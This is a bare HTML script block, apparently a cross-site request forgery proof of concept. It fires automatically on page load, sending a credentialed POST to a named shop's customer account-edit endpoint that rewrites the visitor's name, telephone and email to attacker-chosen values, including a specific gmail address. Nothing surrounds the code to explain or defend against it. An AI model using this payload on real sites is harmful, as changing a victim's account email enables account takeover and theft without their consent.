<script>

      function submitRequest()

      {

        var xhr = new XMLHttpRequest();

        xhr.open("POST", "https://www.fixfixfixfix.co.il/customer/ajax/post/", true);

        xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");

        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");

        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");

        xhr.withCredentials = true;

        var body = "form_key=xCThnAxL71YFV23A&bot_validation=1&type=edit&firstname=test&lastname=tester&telephone=&email=steaminfo.supp@gmail.com";

        var aBody = new Uint8Array(body.length);

        for (var i = 0; i < aBody.length; i++)

          aBody[i] = body.charCodeAt(i); 

        xhr.send(new Blob([aBody]));

      }

      submitRequest();
</script>
